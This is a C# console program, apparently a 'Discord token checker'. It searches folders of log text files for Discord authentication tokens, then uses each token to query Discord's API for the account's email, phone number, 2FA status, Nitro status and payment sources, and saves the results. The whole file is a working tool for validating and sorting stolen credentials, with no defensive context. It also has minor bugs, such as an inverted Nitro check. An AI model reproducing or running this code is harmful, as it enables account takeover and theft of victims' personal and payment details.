using System;
using System.Collections.Generic;
using Newtonsoft.Json;
using System.IO;
using System.Text.RegularExpressions;
using System.Net;
using System.Threading.Tasks;

namespace DiscordTokenChecker
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Title = "DiscordChecker";
            Console.WriteLine("Enter the path to the log folders: ");
            string path = Convert.ToString(Console.ReadLine());

            List<string> tokens = FindTokens(path);

            List<string> getAccountInfoTokens = GetAccountInfo(tokens);

            WriteLogFile(getAccountInfoTokens);
        }
        static void WriteLogFile(List<string> content)
        {
            foreach (string lines in content)
                File.WriteAllLines("Results.txt", content);
        }

        static List<string> GetAccountInfo(List<string> tokens)
        {
            List<string> logFile = new List<string>();

            foreach (string token in tokens)
            {
                string infoJson = SentAPIRequest(token, "https://discordapp.com/api/v9/users/@me");

                if (!String.IsNullOrEmpty(infoJson))
                {
                    var info = JsonConvert.DeserializeObject<AccountInfo>(infoJson);

                    string hasNitro = info.premium_type.ToString().Length > 0 ? "False" : "True";

                    string logResult = $"username: {info.username}#{info.discriminator}\n" +
                        $"email: {info.email}\n" +
                        $"phone: {info.phone}\n" +
                        $"locale: {info.locale}\n" +
                        $"verified: {info.verified}\n" +
                        $"2FA: {info.mfa_enabled}\n" +
                        $"paymentMethod: {HasPaymentMethod(token)}\n" +
                        $"hasNitro: {hasNitro}\n" +
                        $"[==================================]";

                    logFile.Add(logResult);
                }
                    
            }

            return logFile;
        }

        static bool HasPaymentMethod(string token)
        {
            string paymentMethodInformation = SentAPIRequest(token, "https://discordapp.com/api/v9/users/@me/billing/payment-sources");

            if (!String.IsNullOrEmpty(paymentMethodInformation) && paymentMethodInformation.Length > 2) return true;

            return false;
        }

        static string SentAPIRequest(string token, string url) 
        {
            try
            {
                using (WebClient webClient = new WebClient())
                {
                    webClient.Headers.Add("Content-Type", "application/json");
                    webClient.Headers.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11");
                    webClient.Headers.Add("Authorization", token);

                    return webClient.DownloadString(url);

                }
            }
            catch (WebException) { return null; }
        }

        static List<string> FindTokens(string path)
        {
            List<string> tokens = new List<string>();

            Parallel.ForEach(Directory.EnumerateFiles(path, "*.txt", SearchOption.AllDirectories), files =>  
            {
                Parallel.ForEach(File.ReadLines(files), lines => 
                {
                    if (Regex.IsMatch(lines, @"^[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}") && !tokens.Contains(lines))
                        tokens.Add(lines);
                });
            });

            return tokens;
        }
    }

    public class AccountInfo
    {
        public string id { get; set; }
        public string username { get; set; }
        public string discriminator { get; set; }
        public string locale { get; set; }
        public bool mfa_enabled { get; set; }
        public int premium_type { get; set; }
        public string email { get; set; }
        public bool verified { get; set; }
        public string phone { get; set; }
    }
}
